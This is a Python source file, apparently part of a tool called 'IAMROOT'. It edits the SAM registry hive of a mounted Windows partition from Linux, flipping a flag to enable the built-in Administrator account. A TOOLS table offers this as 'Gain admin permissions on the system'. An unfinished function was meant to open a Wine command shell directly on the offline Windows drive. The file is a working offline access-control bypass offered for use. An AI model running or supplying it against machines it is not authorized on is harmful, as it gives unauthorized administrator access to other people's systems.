import os
import shutil
import subprocess
import time

WINDOWS_ROOT = {
    "Windows",
    "Users"
}

ELEVATED_ADMIN = r"\SAM\Domains\Account\Users\000001F4"

WINE_CASE_FIX = [
    ("Windows", "windows"),
    ("windows/System32", "windows/system32"),
]

WINE_RUNTIME_IMPORT = [
    "windows/system32/start.exe",
    "windows/system32/aclui.dll"
]

def write_temp_reg(hive):
    print("Writing...")
    cmd = ["reged", "-C", "-I", hive, r"HKEY_LOCAL_MACHINE", "temp.reg"]
    proc = subprocess.Popen(cmd)
    proc.wait()
    if proc.returncode not in [2, 0]:
        raise subprocess.CalledProcessError(proc.returncode, cmd)
    print("Ceaning up...")
    os.remove("temp.reg")

def is_readonly(mountpoint):
    with open("/proc/mounts") as f:
        for line in f:
            device, mount, driver, tags, _, _ = line.split(" ", maxsplit=6)
            if mount == mountpoint.rstrip("/"):
                tags = tags.split(",")
                if "ro" in tags:
                    return True
                else:
                    return False
    raise ValueError("Mountpoint not found in /proc/mounts")

def is_windows(device):
    try:
        ls_output = subprocess.check_output(["sudo", "ntfsls", "-f", device]).decode("utf-8")
    except subprocess.CalledProcessError as e:
        print(e)
        return False
    ls_contents = ls_output.split("\n")
    if WINDOWS_ROOT.intersection(ls_contents) == WINDOWS_ROOT: # WINDOWS_ROOT is fully contained in ls_contents
        return True
    else:
        return False

def assert_readwrite(mountpoint):
    if is_readonly(mountpoint):
        print("The filesystem was mounted as readonly")
        print("This could mean that windows was not shut down properly")
        print("To fully shutdown Windows press Shift+PowerOff in the start menu")
        exit(1)

def roothack_windows(mountpoint):
    print("Windows roothack")
    assert_readwrite(mountpoint)

    HKLM_Sam_Hive = os.path.join(mountpoint, "Windows/System32/config/SAM")

    print("Hive:", HKLM_Sam_Hive)
    print("Exporting elevated admin...")
    
    subprocess.check_call(["reged", "-x", HKLM_Sam_Hive, r"HKEY_LOCAL_MACHINE\SAM", ELEVATED_ADMIN, "temp.reg"])

    bts = bytearray([])

    key = False
    with open("temp.reg", "r") as f:
        for line in f.readlines():
            part = None
            if line.startswith("\"F\"=hex:"):
                key = True
                part = line[9:-3]
            elif key:
                if line.endswith("\\\n"):
                    part = line[3:-3]
                else:
                    part = line[3:]
            if part:
                print(repr(part))
                for byte in part.split(","):
                    bts.append(int(byte, 16))
    
    if not key:
        print(r"Unable to get SAM\Domains\Account\Users\000001F4\F")
        print("ElevatedAdmin is corrupted")
        exit(1)
    
    print("Value:", bts)

    enabled = bts[56]
    if enabled == 0x10:
        print("System is already roothacked")
        if input("Do you wand to remove it (N/y)? ").lower() == "y":
            print("Creating temp.reg...")
            bts[56] = 0x11
            contents = fr"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SAM\Domains\Account\Users\000001F4]
"F"=hex:{",".join([hex(0x100+i)[3:] for i in bts])}
    """
            with open("temp.reg", "w") as f:
                f.write(contents)
            
            write_temp_reg(HKLM_Sam_Hive)
            print("Disabled ElevatedAdmin")

    if enabled != 0x11 and enabled != 0x10:
        print("Elevated Admin user is corrupted. (status:", enabled, ")")
        if input("Try to recover (The system may be damaged!) (N/y)? ").lower() == "y":
            enabled = 0x11
        else:
            exit(1)

    if enabled == 0x11:
        print("Creating temp.reg...")
        bts[56] = 0x10
        contents = fr"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SAM\Domains\Account\Users\000001F4]
"F"=hex:{",".join([hex(0x100+i)[3:] for i in bts])}
"""
        with open("temp.reg", "w") as f:
            f.write(contents)

        write_temp_reg(HKLM_Sam_Hive)
        print("Enabled EvelatedAdmin")
        print("You can now boot back into the os log in as Administrator")
        print("This account can have diffrent names depending on the system language")

def direct_shell(mountpoint):
    print("Windows direct shell")
    raise NotImplementedError

    assert_readwrite(mountpoint)
    
    ver = subprocess.Popen("wine --version", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if ver.wait():
        print("Direct shell requires WINE to be installed")
        print("Install wine using your package manager")
        exit(1)
    version_encoded, _ = ver.communicate()
    version = version_encoded.decode("utf-8").strip("\n")
    print("Wine version:", version)

    passwd_line = subprocess.check_output("getent passwd | grep -E \"^`logname`\"", shell=True).decode()
    username, password, uid, gid, longname, homedir, shell = passwd_line.split(":")
    wine_c = os.path.join(homedir, ".wine/drive_c")
    wine_c_bak = os.path.join(homedir, ".wine/drive_c.IAMROOT.BAK")
    print("C:", wine_c)
    
    runtime_copied = []
    if os.path.exists(wine_c) and not os.path.exists(wine_c_bak):
        print("Making drive_c backup...")
        os.rename(wine_c, wine_c_bak)
    try:
        print("Symlinking the filesystem...")
        os.symlink(mountpoint, wine_c)

        print("Fixing casing...")
        for src, dst in WINE_CASE_FIX:
            print(src, "->", dst)
            os.rename(os.path.join(wine_c, src), os.path.join(wine_c, dst))

        print("Copying wine runtime files...")
        for file in WINE_RUNTIME_IMPORT:
            print(file)
            if not os.path.exists(os.path.join(wine_c, file)):
                if not os.path.exists(os.path.join(wine_c_bak, file)):
                    print("WARNING: Runtime file", file, "was not found in drive_c backup")
                    continue
                print("Copying", file)
                runtime_copied.append(file)
                shutil.copy(os.path.join(wine_c_bak, file), os.path.join(wine_c, file))

        print("Running explorer...")
        subprocess.Popen(["sudo", "su", username, "-c", "wine cmd"]).wait()
    except Exception as e:
        print("An error occured!")
        print(type(e).__name__+":", str(e))
    finally:
        print("Exited.")

        print("Removing wine runtime files...")
        for file in runtime_copied:
            if not os.path.exists(os.path.join(wine_c, file)):
                print("WARNING: Runtime file", file, "was marked as copied, but it's not found")
                continue
            os.remove(os.path.join(wine_c, file))

        print("Restoring casing...")
        for src, dst in reversed(WINE_CASE_FIX):
            print(dst, "->", src)
            os.rename(os.path.join(wine_c, dst), os.path.join(wine_c, src))

        if os.path.islink(wine_c):
            print("Removing symlink...")
            os.remove(wine_c)
        if os.path.exists(wine_c_bak):
            print("Restoring backup...")
            os.rename(wine_c_bak, wine_c)
        print("Restored.")

TOOLS = {
    "Gain admin permissions on the system": roothack_windows,
}